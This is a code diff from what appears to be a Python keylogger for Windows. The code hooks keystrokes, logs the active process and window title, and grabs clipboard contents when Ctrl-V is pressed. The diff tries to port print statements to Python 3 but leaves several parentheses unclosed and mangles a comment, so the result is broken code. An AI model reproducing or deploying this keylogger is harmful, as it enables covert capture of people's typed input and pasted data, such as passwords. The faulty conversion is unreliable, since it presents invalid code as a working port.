@@ -30,9 +30,9 @@ def get_current_process():
     window_title = create_string_buffer("\x00" * 512)
     length = user32.GetWindowTextA(hwnd, byref(window_title),512)
 
-    # print out the header if we're in the right process
+    # print(out the header if we're in the right process
     print
-    print "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
+    print("[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
     print
   
 
@@ -51,7 +51,7 @@ def KeyStroke(event):
 
     # if they pressed a standard key
     if event.Ascii > 32 and event.Ascii < 127:
-        print chr(event.Ascii),
+        print(chr(event.Ascii),
     else:
         # if [Ctrl-V], get the value on the clipboard
         # added by Dan Frisch 2014
@@ -59,9 +59,9 @@ def KeyStroke(event):
             win32clipboard.OpenClipboard()
             pasted_value = win32clipboard.GetClipboardData()
             win32clipboard.CloseClipboard()
-            print "[PASTE] - %s" % (pasted_value),
+            print("[PASTE] - %s" % (pasted_value),
         else:
-            print "[%s]" % event.Key,
+            print("[%s]" % event.Key,
 
     # pass execution to next hook registered 
     return True
